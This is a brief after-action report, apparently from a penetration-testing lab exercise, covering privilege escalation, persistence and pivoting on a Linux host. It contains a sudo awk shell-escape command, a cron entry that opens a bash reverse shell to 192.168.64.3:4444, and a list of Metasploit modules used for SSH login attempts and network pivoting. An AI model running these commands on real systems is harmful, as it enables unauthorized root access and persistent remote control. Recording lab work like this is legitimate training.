# OPERATION DEEP PIVOT: AFTER ACTION REPORT
**Operator:** melakee

## PHASE 1: PRIVILEGE ESCALATION
* **Initial Access User:** mercenary
* **Vulnerable Sudo Binary:** /usr/bin/awk
* **GTFOBins Exploit Command Used:** sudo awk 'BEGIN {system("/bin/sh")}'
* **Verification (whoami output):** root

## PHASE 2: PERSISTENCE
* **Cron Syntax Used:** * * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.64.3/4444 0>&1'
* **Persistence Confirmed:** Yes

## PHASE 3: LATERAL MOVEMENT (THE PIVOT)
* **Metasploit Modules Used:** auxiliary/scanner/ssh/ssh_login, auxiliary/server/socks_proxy, post/multi/manage/autoroute
* **Hidden Database IP Discovered:** 10.0.10.50
* **Open Port on Hidden Database:** 6379 (Redis)
